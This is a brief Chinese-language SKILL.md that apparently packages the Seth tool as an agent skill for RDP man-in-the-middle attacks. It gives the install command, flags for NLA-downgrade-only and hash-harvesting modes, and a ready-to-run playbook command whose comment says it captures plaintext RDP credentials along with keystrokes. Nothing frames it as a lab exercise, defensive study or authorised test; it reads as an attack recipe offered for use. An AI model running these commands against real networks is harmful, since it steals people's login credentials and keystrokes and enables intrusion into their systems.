---
name: seth-rdp-mitm
description: Seth: RDP 明文凭据截获。信号:中间人,mitm,RDP 中间人,仅降级攻击,哈希收割。
---

# Seth

- 攻击大类:C40 嗅探与中间人攻击
- 上游仓库:https://github.com/SySS-Research/Seth
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/SySS-Research/Seth && cd Seth && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./seth.sh eth0 10.0.0.5 10.0.0.6 3389` | RDP 中间人 |
| `-j` | 仅降级攻击 |
| `-h` | 哈希收割 |

## 攻击场景 Playbook

### RDP 明文凭据截获

```bash
./seth.sh eth0 10.0.0.5 10.0.0.6 3389
# 降级 NLA 抓明文+键盘记录
```

## 注意事项

SySS 出品 RDP 中间人,降 NLA+截凭据。
